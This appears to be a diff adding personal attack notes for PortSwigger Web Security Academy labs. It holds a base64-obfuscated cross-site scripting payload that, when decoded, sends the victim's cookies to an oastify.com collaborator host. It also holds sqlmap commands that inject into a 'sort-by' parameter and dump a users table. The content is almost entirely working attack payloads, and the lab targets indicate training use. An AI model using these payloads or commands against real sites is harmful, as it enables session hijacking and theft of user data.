@@ -1,0 +1,12 @@
+delivery
+<script>
+location = "https://0a9e000d047376a4804a128f00690043.web-security-academy.net/?SearchTerm=\"-eval(atob('bG9jYXRpb249J2h0dHBzOi8vamQwY2Q0d2pxZGNrZ2FqOTFzeTloZ3k1M3c5bnhmbDQub2FzdGlmeS5jb20vP2M9Jytkb2N1bWVudC5jb29raWU='))-\"";
+</script>
+
+
+sqlmap 
+sqlmap -r request -- level=5 -- risk=3 -batch -p 'sort-by'
+$ sqlmap -r request -- level=5 -- risk=3 -batch -p 'sort-by' -- dump -D public -T users
+
+
+
